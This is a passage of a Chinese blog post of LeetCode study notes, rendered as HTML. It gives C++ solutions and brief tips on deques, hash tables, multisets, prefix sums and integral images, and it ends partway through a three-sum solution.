<span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        deque&lt;<span class="type">int</span>&gt; maxArr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!maxArr.<span class="built_in">empty</span>() &amp;&amp; nums[i] &gt; nums[maxArr.<span class="built_in">back</span>()]) </span><br><span class="line">                maxArr.<span class="built_in">pop_back</span>();</span><br><span class="line">            maxArr.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(nums[maxArr.<span class="built_in">front</span>()]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxArr.<span class="built_in">front</span>() == i - k)</span><br><span class="line">                maxArr.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">while</span> (!maxArr.<span class="built_in">empty</span>() &amp;&amp; nums[i] &gt; nums[maxArr.<span class="built_in">back</span>()])</span><br><span class="line">                maxArr.<span class="built_in">pop_back</span>();</span><br><span class="line">            maxArr.<span class="built_in">push_back</span>(i);</span><br><span class="line">            res.<span class="built_in">push_back</span>(nums[maxArr.<span class="built_in">front</span>()]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：我们可以利用双端队列进行操作：每当向右移动时，把窗口左端的值从双端队列左端剔除，把双端队列右边小于窗口右端的值全部剔除。这样双端队列的最左端永远是当前窗口内的最大值。另外，这道题也是单调栈的一种延申：该双端队列利用从左到右递减来维持大小关系。</p></li></ul><h2 id="六、哈希表"><a href="#六、哈希表" class="headerlink" title="六、哈希表"></a>六、哈希表</h2><ul><li><p>算法解释：哈希表(hash table, hash map)，又称散列表，使用O(n)空间复杂度存储数据，通过哈希函数(hash function)映射位置，从而实现近似O(1)时间复杂度的插入、查找、删除等操作。哈希表可以用来统计频率，记录内容等等。</p></li><li><p>题目一：<a href="https://leetcode.cn/problems/two-sum">两数之和</a><br>给定一个(未排序的)整数数组，已知有且只有两个数的和等于给定值，求这两个数的位置。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.<span class="built_in">count</span>(target - nums[i]) != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> &#123;i, map[target - nums[i]]&#125;;</span><br><span class="line">            map.<span class="built_in">emplace</span>(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：典中典之空间换时间。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/longest-consecutive-sequence">最长连续序列</a><br>给定一个整数数组，求这个数组中的数字可以组成的最长连续序列有多长。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">set</span><span class="params">(nums.begin(), nums.end())</span></span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!set.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> temp = *set.<span class="built_in">begin</span>();</span><br><span class="line">            <span class="type">int</span> temp2 = temp;</span><br><span class="line">            set.<span class="built_in">erase</span>(temp);</span><br><span class="line">            <span class="keyword">while</span> (set.<span class="built_in">count</span>(temp - <span class="number">1</span>)) &#123;</span><br><span class="line">                ++len;</span><br><span class="line">                --temp;</span><br><span class="line">                set.<span class="built_in">erase</span>(temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (set.<span class="built_in">count</span>(temp2 + <span class="number">1</span>)) &#123;</span><br><span class="line">                ++len;</span><br><span class="line">                ++temp2;</span><br><span class="line">                set.<span class="built_in">erase</span>(temp2);</span><br><span class="line">            &#125;</span><br><span class="line">            res = <span class="built_in">max</span>(res, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：我讨厌这道题，实际上并不难，想一下怎样才不会漏算或者多算，答案就是直接向两边遍历即可。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/max-points-on-a-line">直线上最多的点数</a><br>给定一些二维坐标中的点，求同一条线上最多有多少点。<br><img src="https://assets.leetcode.com/uploads/2021/02/25/plane2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> n = points.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">auto</span> vec1 = points[i];</span><br><span class="line">            unordered_map&lt;<span class="type">double</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">auto</span> vec2 = points[j];</span><br><span class="line">                <span class="type">double</span> k = vec2[<span class="number">0</span>] - vec1[<span class="number">0</span>] == <span class="number">0</span> ? <span class="number">1e8</span> : (<span class="type">double</span>)(vec2[<span class="number">1</span>] - vec1[<span class="number">1</span>]) / (<span class="type">double</span>)(vec2[<span class="number">0</span>] - vec1[<span class="number">0</span>]);</span><br><span class="line">                ++map[k];</span><br><span class="line">                res = <span class="built_in">max</span>(res, map[k] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：hash表用以记录斜率和数量，小技巧是第i个节点只需要算i+1以及之后的点，因为之前的点已经在之前算过了。</p></li></ul><h2 id="七、多重集合和映射"><a href="#七、多重集合和映射" class="headerlink" title="七、多重集合和映射"></a>七、多重集合和映射</h2><ul><li><p>题目：<a href="https://leetcode.cn/problems/reconstruct-itinerary">重新安排行程</a><br>给定一个人坐过的一些飞机的起止机场，已知这个人从 JFK 起飞，那么这个人是按什么顺序飞的；如果存在多种可能性，返回字母序最小的那种。<br><img src="https://assets.leetcode.com/uploads/2021/03/14/itinerary2-graph.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    unordered_map&lt;string, multiset&lt;string&gt;&gt; adj;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">const</span> string &amp;s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!adj[s].<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            string next = *adj[s].<span class="built_in">begin</span>();</span><br><span class="line">            adj[s].<span class="built_in">erase</span>(adj[s].<span class="built_in">begin</span>());</span><br><span class="line">            <span class="built_in">dfs</span>(next);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">findItinerary</span><span class="params">(vector&lt;vector&lt;string&gt;&gt; &amp;tickets)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span> &amp;ticket : tickets) &#123;</span><br><span class="line">            adj[ticket[<span class="number">0</span>]].<span class="built_in">insert</span>(ticket[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="string">&quot;JFK&quot;</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很难很难的题，直接用深搜暴力遍历的话也是无法做出来的，关键是在于如何剪枝，当一条路经走完后应该直接跳到之前的某个点。而这里的代码很巧妙的解决了这个问题，当adj[s]为empty的时候会返回之前的节点，而且当该路经可通时才把整个路经push进res。因为是倒着push的，所以最后需要reverse。</p></li></ul><h2 id="八、前缀和与积分图"><a href="#八、前缀和与积分图" class="headerlink" title="八、前缀和与积分图"></a>八、前缀和与积分图</h2><ul><li><p>算法解释：一维的前缀和(cumulative sum)，二维的积分图(summed-area table, image integral)都是把每个位置之前的一维线段或二维矩形预先存储，方便加速计算。如果需要对前缀和或积分图的值做寻址，则要存入哈希表；如果要对每个位置记录前缀和或积分图的值，则可以储存到一维或二维数组里，也常常伴随着动态规划。</p></li><li><p>题目一：<a href="https://leetcode.cn/problems/range-sum-query-immutable">区域和检索 - 数组不可变</a><br>设计一个数据结构，使得其能够快速查询给定数组中，任意两个位置间所有数字的和。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; myNums;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">NumArray</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            nums[i] += nums[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        myNums.<span class="built_in">push_back</span>(<span class="number">0</span>);</span><br><span class="line">        myNums.<span class="built_in">insert</span>(myNums.<span class="built_in">begin</span>() + <span class="number">1</span>, nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> myNums[right + <span class="number">1</span>] - myNums[left];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用前缀和来完成，注意需要一个前置零来标志前缀和为零的情况。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/range-sum-query-2d-immutable">二维区域和检索 - 矩阵不可变</a><br>设计一个数据结构，使得其能够快速查询给定矩阵中，任意两个位置包围的长方形中所有数字的和。<br><img src="https://pic.leetcode-cn.com/1626332422-wUpUHT-image.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumMatrix</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">NumMatrix</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        <span class="type">int</span> n = matrix.<span class="built_in">size</span>(), m = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        myMatrix.<span class="built_in">assign</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; ++j) &#123;</span><br><span class="line">                myMatrix[i][j] = matrix[i - <span class="number">1</span>][j - <span class="number">1</span>] + myMatrix[i - <span class="number">1</span>][j] + myMatrix[i][j - <span class="number">1</span>] - myMatrix[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">sumRegion</span><span class="params">(<span class="type">int</span> row1, <span class="type">int</span> col1, <span class="type">int</span> row2, <span class="type">int</span> col2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> myMatrix[row2 + <span class="number">1</span>][col2 + <span class="number">1</span>] - myMatrix[row1][col2 + <span class="number">1</span>] - myMatrix[row2 + <span class="number">1</span>][col1] + myMatrix[row1][col1];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; myMatrix;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意一下前缀和的计算方式即可，注意会有有重复的部分。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/subarray-sum-equals-k">和为 K 的子数组</a><br>给定一个数组，寻找和为k的连续区间个数。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> prefix = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        map[prefix] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            prefix += num;</span><br><span class="line">            count += map[prefix - k];</span><br><span class="line">            ++map[prefix];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要利用map来快速查找是否有对应的前缀和，连续区间经常使用前缀和来表示。</p></li></ul><h2 id="九、练习"><a href="#九、练习" class="headerlink" title="九、练习"></a>九、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/reshape-the-matrix?source=vscode">重塑矩阵</a><br>将一个m*n的矩阵转化为r*l的矩阵。<br><img src="https://assets.leetcode.com/uploads/2021/04/24/reshape1-grid.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">matrixReshape</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mat, <span class="type">int</span> r, <span class="type">int</span> c) &#123;</span><br><span class="line">        <span class="type">int</span> n = mat.<span class="built_in">size</span>(), m = mat[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span> (n * m != r * c) <span class="keyword">return</span> mat;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">reshapeMat</span>(r, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(c));</span><br><span class="line">        <span class="type">int</span> row = <span class="number">0</span>, column = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; ++j) &#123;</span><br><span class="line">                reshapeMat[row][column++] = mat[i][j];</span><br><span class="line">                <span class="keyword">if</span> (column == c) &#123;</span><br><span class="line">                    column = <span class="number">0</span>;</span><br><span class="line">                    ++row;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reshapeMat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单，没什么好说的。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/next-greater-element-ii?source=vscode">下一个更大元素 II</a><br>给定一个循环数组nums(nums[nums.length - 1]的下一个元素是nums[0])，返回nums中每个元素的下一个更大元素。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nextGreaterElements</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = nums.<span class="built_in">size</span>();</span><br><span class="line">        nums.<span class="built_in">insert</span>(nums.<span class="built_in">end</span>(), nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>() - <span class="number">1</span>);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(size, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size * <span class="number">2</span> - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.<span class="built_in">empty</span>() &amp;&amp; nums[i] &gt; nums[stack.<span class="built_in">back</span>()]) &#123;</span><br><span class="line">                <span class="type">int</span> index = stack.<span class="built_in">back</span>() % size;</span><br><span class="line">                res[index] = nums[i];</span><br><span class="line">                stack.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            stack.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：有点儿意思但不多，核心考点是单调栈，然后循环的处理很简单，直接在后面接上前面的元素就行了。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/degree-of-an-array?source=vscode">数组的度</a><br>给定一个非空且只包含非负数的整数数组nums，数组的度的定义是指数组里任一元素出现频数的最大值。你的任务是在nums中找到与nums拥有相同大小的度的最短连续子数组，返回其长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findShortestSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map1;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; map2;</span><br><span class="line">        <span class="type">int</span> maxCount = <span class="number">0</span>, minLength = <span class="number">50001</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map<span class="number">2.</span><span class="built_in">count</span>(nums[i]))</span><br><span class="line">                map2[nums[i]].second = i;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                map2[nums[i]] = &#123;i, i&#125;;</span><br><span class="line">            ++map1[nums[i]];</span><br><span class="line">            maxCount = <span class="built_in">max</span>(map1[nums[i]], maxCount);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [i, j] : map1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j == maxCount) &#123;</span><br><span class="line">                <span class="type">int</span> len = map2[i].second - map2[i].first + <span class="number">1</span>;</span><br><span class="line">                minLength = <span class="built_in">min</span>(minLength, len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minLength;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：不是很难，主要是两个映射关系，数字对度和数字对长度。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/longest-harmonious-subsequence?source=vscode">最长和谐子序列</a><br>和谐数组是指一个数组里元素的最大值和最小值之间的差别正好是1。给你一个整数数组nums，请你在所有可能的子序列中找到最长的和谐子序列的长度。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findLHS</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; map;</span><br><span class="line">        <span class="type">int</span> maxCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) ++map[num];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [i, j] : map) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.<span class="built_in">count</span>(i - <span class="number">1</span>))</span><br><span class="line">                maxCount = <span class="built_in">max</span>(maxCount, j + map[i - <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (map.<span class="built_in">count</span>(i + <span class="number">1</span>))</span><br><span class="line">                maxCount = <span class="built_in">max</span>(maxCount, j + map[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记住需要先count,这才是效率更高的做法。如果直接加<code>map[i - 1]</code>的话，map会自己创建一个{i - 1, 0}。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/3sum/submissions/669299997?source=vscode">三数之和</a><br>给你一个整数数组nums，请你返回所有和为0且下标不重复、值不重复的三元组。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt; &amp;nums) &#123;</span><br><span class="line">        